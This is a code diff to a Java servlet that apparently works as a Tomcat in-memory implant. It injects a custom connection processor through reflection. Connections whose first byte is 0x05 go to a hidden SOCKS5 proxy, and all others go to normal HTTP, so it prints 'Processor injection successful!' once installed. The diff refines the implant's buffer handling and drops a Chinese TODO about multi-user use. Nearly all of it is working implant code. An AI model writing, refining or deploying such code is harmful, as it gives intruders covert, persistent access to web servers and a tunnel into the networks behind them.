@@ -70,20 +70,20 @@ public class socks5 extends HttpServlet {
                             if (status == SocketEvent.OPEN_READ) {
                                 NioChannel socket1 = (NioChannel) socketWrapper.getSocket();
                                 SocketChannel ioChannel = socket1.getIOChannel();
-                                ByteBuffer buffer = ByteBuffer.allocate(0);
-                                int read = socketWrapper.read(false, buffer);
-                                if (read < 0) {
-                                    return super.process(socketWrapper, status);
-                                }
                                 ByteBuffer readBuffer = socketWrapper.getSocketBufferHandler().getReadBuffer();
-                                byte b = readBuffer.get(0);
-                                if (b == 0x05) {
+                                ByteBuffer buffer = ByteBuffer.allocate(1);
+                                int read = socketWrapper.read(false, buffer);
+                                if (read == 1 && buffer.get(0) == 0x05) {
+                                    readBuffer.position(0);
                                     Socks5Server socks5Server = new Socks5Server();
                                     socks5Server.handleClient(ioChannel, socketWrapper);
                                     return AbstractEndpoint.Handler.SocketState.CLOSED;
+                                } else {
+                                    readBuffer.position(0);
+                                    return service(socketWrapper);
                                 }
                             }
-                            return super.process(socketWrapper, status);
+                            return service(socketWrapper);
                         }
                     };
                     http11Processor.setAdapter(adapter);
@@ -106,7 +106,6 @@ public class socks5 extends HttpServlet {
             stack.set(o, objects);
             Field index = o.getClass().getSuperclass().getDeclaredField("index");
             index.setAccessible(true);
-            // todo： 单线程，这里需要去实时修改，需要考虑到多用户的场景，可能会有
             index.set(o, -3);
             resp.getWriter().write("Processor injection successful!");
         } catch (Exception exception) {
